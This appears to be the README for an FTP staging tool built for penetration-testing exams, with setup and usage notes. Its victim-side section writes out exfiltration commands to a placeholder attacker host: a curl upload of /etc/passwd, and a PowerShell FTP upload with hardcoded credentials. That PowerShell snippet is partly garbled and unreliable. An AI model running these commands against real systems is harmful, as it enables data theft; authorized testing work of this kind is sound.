# 🩹 No Longer Human: File Stager (dazai_ftp.py)

An ultra-lightweight, rapid-deployment FTP staging server forged in the image of **Osamu Dazai**. Built specifically to handle effortless file transfers, script deployment, and quick data exfiltration during the **CPTS** and **OSCP** exams, this tool replaces heavy default services with a clean, low-overhead staging node.

## ⚡ Features

*   **Apathetic Access Modes**: Toggle instantly between structured credentialed access and seamless anonymous read/write setups for scriptless file drops.
*   **The Armed Detective Agency Threading**: Leverages an asynchronous event loop (`pyftpdlib`) to streamline multi-session binary downloads and big log drops without locking your terminal thread.
*   **Perception Tracking Logs**: Automatically filters out underlying socket noise to log only connection endpoints, download paths, and upload data streams cleanly for your exam notes.
*   **Low Barrier Deployment**: Binds globally onto all local host adapters with single-line configuration syntax.

## 🛠️ Prerequisites

Equip your attack workstation with the production-ready Python FTP package before launching:

```bash
pip install pyftpdlib
```

## 🚀 Usage

```bash
python dazai_ftp.py [-p <PORT>] [-d <DIRECTORY>] [--anonymous]
```

### Options
*   `-p`, `--port` : The localized target network port to bind on (Default: `2121`)
*   `-d`, `--directory` : The local folder path to serve files to/from (Default: current working directory)
*   `--anonymous` : Enables seamless, unauthenticated read/write access for fast data drops

---

## 🎯 Combat Deployments

### Scenario A: Deploying an Anonymous Quick-Drop Hub
Perfect for throwing data out of a restrictive environment without managing authentication parameters.
```bash
python dazai_ftp.py --anonymous -p 2121 -d /home/kali/loot
```

### Scenario B: Authenticated Tool Staging on Port 21
Ideal for pushing your post-exploitation scripts down onto footholds. *(Note: Low-port configurations require `sudo` privileges).*
```bash
sudo python dazai_ftp.py -p 21 -d /home/kali/tools
```

---

## 💻 Interfacing with Targets (Victim-Side)

### From a Linux Target Shell (`curl`)
Exfiltrate system configuration archives up to your staging node seamlessly:
```bash
curl -T /etc/passwd ftp://<YOUR_ATTACKER_IP>:2121/exfil_passwd.txt
```

### From a Windows Target Shell (`PowerShell`)
Upload a localized flag file directly into your authenticated staging directory:
```powershell
\$ftp = [System.Net.FtpWebRequest]::Create("ftp://<YOUR_ATTACKER_IP>:2121/proof.txt")
\(ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile\)ftp.Credentials = New-Object System.Net.NetworkCredential("dazai","det-agency-password")
\$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\proof.txt")
\$ftp.GetRequestStream().Write(bytes, 0, bytes.Length)
```

---
*Disclaimer: Forged explicitly for authorized security assessments, CTF gameplay, and educational structures. Let's move our data effortlessly.*
